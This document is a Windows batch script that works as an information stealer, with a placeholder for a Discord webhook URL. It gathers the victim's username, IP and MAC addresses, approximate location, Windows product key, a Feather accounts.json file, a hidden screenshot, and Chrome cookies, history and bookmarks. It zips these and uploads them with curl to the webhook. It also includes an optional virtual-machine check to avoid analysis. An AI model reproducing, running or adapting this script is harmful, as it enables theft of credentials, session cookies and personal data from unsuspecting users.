<!-- : Begin batch script
@echo off
setlocal

set webhook=Replace me with ur webhook!
set tempDir=%temp%\my_script_temp
set antiVM=false
set startOnStartup=false
set accountFile=C:\Users\%username%\AppData\Roaming\.feather\accounts.json

:start
rem Create a temporary directory
mkdir "%tempDir%" 2>nul

rem Check Anti-VM
if "%antiVM%"=="true" (
    wmic path win32_videocontroller get name | findstr /i "virtualbox" >nul
    if not errorlevel 1 (
        echo Anti-VM check failed. Exiting...
        timeout 2 >NUL
        exit /b
    )
)

rem Get PC username and name
for /F "usebackq tokens=2 delims=\ " %%U in (`whoami`) do set "username=%%U"
set "pcname=%computername%"

rem Get IPv4 and IPv6 addresses
for /F "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /c:"IPv4 Address"') do set "ipv4=%%A"
for /F "tokens=2 delims=:" %%B in ('ipconfig ^| findstr /c:"IPv6 Address"') do set "ipv6=%%B"

rem Get MAC address using PowerShell
for /F %%M in ('powershell -command "(Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty MacAddress)"') do set "mac_address=%%M"

rem Get the time when the script was executed
for /F "tokens=1-2 delims=:" %%C in ("%time%") do set "execution_time=%%C:%%D"

rem Use PowerShell to get the latitude and longitude from IP address
for /F "delims=" %%L in ('powershell -command "(Invoke-RestMethod -Uri 'https://ipinfo.io/json').loc"') do set "coordinates=%%L"

rem Generate the Google Maps link
set "maps_link=https://www.google.com/maps/place/%coordinates%"

rem Read the contents of accounts.json
set "accounts_json="
for /F "usebackq delims=" %%G in ("%accountFile%") do (
    set "accounts_json=!accounts_json!%%G"
)

rem Get the Windows product key using VBScript
echo Set WshShell = CreateObject("WScript.Shell") >"%tempDir%\key.vbs"
echo Set FSO = CreateObject("Scripting.FileSystemObject") >>"%tempDir%\key.vbs"
echo Set File = FSO.CreateTextFile("%tempDir%\Productkey.txt", True) >>"%tempDir%\key.vbs"
echo File.Write ConvertToKey(WshShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DigitalProductId")) >>"%tempDir%\key.vbs"
echo File.Close >>"%tempDir%\key.vbs"
echo Function ConvertToKey(Key) >>"%tempDir%\key.vbs"
echo Const KeyOffset = 52 >>"%tempDir%\key.vbs"
echo i = 28 >>"%tempDir%\key.vbs"
echo Chars = "BCDFGHJKMPQRTVWXY2346789" >>"%tempDir%\key.vbs"
echo Do >>"%tempDir%\key.vbs"
echo Cur = 0 >>"%tempDir%\key.vbs"
echo x = 14 >>"%tempDir%\key.vbs"
echo Do >>"%tempDir%\key.vbs"
echo Cur = Cur * 256 >>"%tempDir%\key.vbs"
echo Cur = Key(x + KeyOffset) + Cur >>"%tempDir%\key.vbs"
echo Key(x + KeyOffset) = (Cur \ 24) And 255 >>"%tempDir%\key.vbs"
echo Cur = Cur Mod 24 >>"%tempDir%\key.vbs"
echo x = x -1 >>"%tempDir%\key.vbs"
echo Loop While x ^>= 0 >>"%tempDir%\key.vbs"
echo i = i -1 >>"%tempDir%\key.vbs"
echo KeyOutput = Mid(Chars, Cur + 1, 1) ^& KeyOutput >>"%tempDir%\key.vbs"
echo If (((29 - i) Mod 6) = 0) And (i ^<^> -1) Then >>"%tempDir%\key.vbs"
echo i = i -1 >>"%tempDir%\key.vbs"
echo KeyOutput = "-" ^& KeyOutput >>"%tempDir%\key.vbs"
echo End If >>"%tempDir%\key.vbs"
echo Loop While i ^>= 0 >>"%tempDir%\key.vbs"
echo ConvertToKey = KeyOutput >>"%tempDir%\key.vbs"
echo End Function >>"%tempDir%\key.vbs"

rem Execute the VBScript to get the product key
CScript.exe //nologo "%tempDir%\key.vbs"
set /p product_key=<"%tempDir%\Productkey.txt"
del "%tempDir%\key.vbs"
del "%tempDir%\Productkey.txt"

rem Create a text file with computer information
echo Computer Information>%tempDir%\computer_info.txt
echo.>>%tempDir%\computer_info.txt
systeminfo>>"%tempDir%\computer_info.txt"

rem Save PC username, PC name, IPv4, IPv6 addresses, MAC address, execution time, product key, accounts.json, and Google Maps link to data.txt
echo :computer: PC Username: %username%>%tempDir%\data.txt
echo :desktop: PC Name: %pcname%>>%tempDir%\data.txt
echo :globe_with_meridians: IPv4 Address: %ipv4%>>%tempDir%\data.txt
echo :globe_with_meridians: IPv6 Address: %ipv6%>>%tempDir%\data.txt
echo :link: City Location: %maps_link%>>%tempDir%\data.txt
echo :computer: MAC Address: `%%mac_address%%`>>%tempDir%\data.txt
echo :key: Product Key: %product_key%>>%tempDir%\data.txt
echo Accounts.json Contents:>>%tempDir%\data.txt
echo %accounts_json%>>%tempDir%\data.txt

rem Capture a screenshot of the desktop silently (without opening CMD)
echo $SERDO = Get-Clipboard >"%tempDir%\screenshot.ps1"
echo function Get-ScreenCapture >>"%tempDir%\screenshot.ps1"
echo { >>"%tempDir%\screenshot.ps1"
echo     begin { >>"%tempDir%\screenshot.ps1"
echo         Add-Type -AssemblyName System.Drawing, System.Windows.Forms >>"%tempDir%\screenshot.ps1"
echo         Add-Type -AssemblyName System.Drawing >>"%tempDir%\screenshot.ps1"
echo         $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() ^| >>"%tempDir%\screenshot.ps1"
echo             Where-Object { $_.FormatDescription -eq "JPEG" } >>"%tempDir%\screenshot.ps1"
echo     } >>"%tempDir%\screenshot.ps1"
echo     process { >>"%tempDir%\screenshot.ps1"
echo         Start-Sleep -Milliseconds 44 >>"%tempDir%\screenshot.ps1"
echo             [Windows.Forms.Sendkeys]::SendWait("{PrtSc}") >>"%tempDir%\screenshot.ps1"
echo         Start-Sleep -Milliseconds 550 >>"%tempDir%\screenshot.ps1"
echo         $bitmap = [Windows.Forms.Clipboard]::GetImage() >>"%tempDir%\screenshot.ps1"
echo         $ep = New-Object Drawing.Imaging.EncoderParameters >>"%tempDir%\screenshot.ps1"
echo         $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100) >>"%tempDir%\screenshot.ps1"
echo         $desktopPath = "%tempDir%\desktop.png" >>"%tempDir%\screenshot.ps1"
echo         $bitmap.Save($desktopPath, $jpegCodec, $ep) >>"%tempDir%\screenshot.ps1"
echo     } >>"%tempDir%\screenshot.ps1"
echo } >>"%tempDir%\screenshot.ps1"
echo Get-ScreenCapture >>"%tempDir%\screenshot.ps1"
echo Set-Clipboard -Value $SERDO >>"%tempDir%\screenshot.ps1"

rem Execute the screenshot script silently (without opening CMD)
Powershell.exe -windowstyle hidden -executionpolicy remotesigned -File "%tempDir%\screenshot.ps1"
del "%tempDir%\screenshot.ps1"

rem Copy browser-related files to the temporary directory (You can add other necessary files here)
copy "%localappdata%\Google\Chrome\User Data\Default\Cookies" "%tempDir%\Chrome_Cookies.txt"
copy "%localappdata%\Google\Chrome\User Data\Default\History" "%tempDir%\Chrome_History.txt"
copy "%localappdata%\Google\Chrome\User Data\Default\Bookmarks" "%tempDir%\Chrome_Bookmarks.txt"

rem Create the .zip file using PowerShell
powershell -noprofile -command "Compress-Archive -Path '%tempDir%\*' -DestinationPath '%tempDir%\data.zip'"

rem Send the .zip file to Discord webhook
curl -k -F file=@"%tempDir%\data.zip" -F content="```Username:%username%``` ```PC Name:%pcname%``` ```IPv4 Address:%ipv4%``` ```IPv6 Address:%ipv6%``` ```Execution Time:%execution_time%``` ```City Location: %maps_link%``` ```MAC Address: %mac_address%``` ```Product Key: %product_key%``` ```Accounts.json Contents: %accounts_json%``` **Credits: [FogmaLOL](https://github.com/FogmaLOL)**" %webhook%

rem Clean up the temporary directory
rd /s /q "%tempDir%"

echo Data sent successfully.
timeout 2 >NUL
exit /b
<!-- : End batch script -->
